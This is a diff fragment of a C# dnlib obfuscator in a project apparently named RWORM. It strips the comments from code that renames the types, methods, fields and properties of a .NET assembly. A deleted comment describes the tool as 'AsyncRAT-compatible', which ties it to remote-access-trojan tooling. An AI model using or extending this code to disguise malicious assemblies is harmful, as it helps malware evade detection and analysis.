@@ -8,11 +8,11 @@ using dnlib.DotNet.Emit;
 
 namespace RWORM.GUI.RenamingObfuscation
 {
-    /// <summary>
-    /// AsyncRAT-compatible symbol and metadata obfuscator based on dnlib.
-    /// Renames namespaces, classes, methods, properties, and fields into randomized identifier tokens
-    /// while safely preserving entry points, P/Invoke signatures, runtime models, and overrides.
-    /// </summary>
+    
+    
+    
+    
+    
     public static class Obfuscator
     {
         private static readonly Random _rng = new();
@@ -22,7 +22,7 @@ namespace RWORM.GUI.RenamingObfuscation
         {
             int len = _rng.Next(minLen, maxLen + 1);
             var sb = new StringBuilder(len);
-            // Ensure first character is a valid identifier letter
+            
             sb.Append(Alphabet[_rng.Next(Alphabet.Length)]);
             for (int i = 1; i < len; i++)
             {
@@ -44,13 +44,13 @@ namespace RWORM.GUI.RenamingObfuscation
                 var methodMap = new Dictionary<string, string>();
                 var fieldMap = new Dictionary<string, string>();
 
-                // 1. Rename Namespaces & Types
+                
                 foreach (TypeDef type in module.GetTypes())
                 {
                     if (type.IsGlobalModuleType || type.IsSpecialName || type.IsRuntimeSpecialName)
                         continue;
 
-                    // Preserve entry point class, WPF generated helpers, resources
+                    
                     if (type.Name.Contains("<") || type.Name.Contains("Program") ||
                         type.Name == "GeneratedInternalTypeHelper" || type.Name == "Resources")
                         continue;
@@ -65,7 +65,7 @@ namespace RWORM.GUI.RenamingObfuscation
                     }
                 }
 
-                // 2. Rename Methods (excluding Main, constructors, P/Invokes, interface implementations, virtual overrides)
+                
                 foreach (TypeDef type in module.GetTypes())
                 {
                     if (type.IsGlobalModuleType) continue;
@@ -84,7 +84,7 @@ namespace RWORM.GUI.RenamingObfuscation
                     }
                 }
 
-                // 3. Rename Fields
+                
                 foreach (TypeDef type in module.GetTypes())
                 {
                     if (type.IsGlobalModuleType) continue;
@@ -100,7 +100,7 @@ namespace RWORM.GUI.RenamingObfuscation
                     }
                 }
 
-                // 4. Rename Properties
+                
                 foreach (TypeDef type in module.GetTypes())
                 {
                     if (type.IsGlobalModuleType) continue;
@@ -114,7 +114,7 @@ namespace RWORM.GUI.RenamingObfuscation
                     }
                 }
 
-                // Write modified assembly back to disk
+                
                 string tempOut = filePath + ".obf.tmp";
                 module.Write(tempOut);
                 module.Dispose();
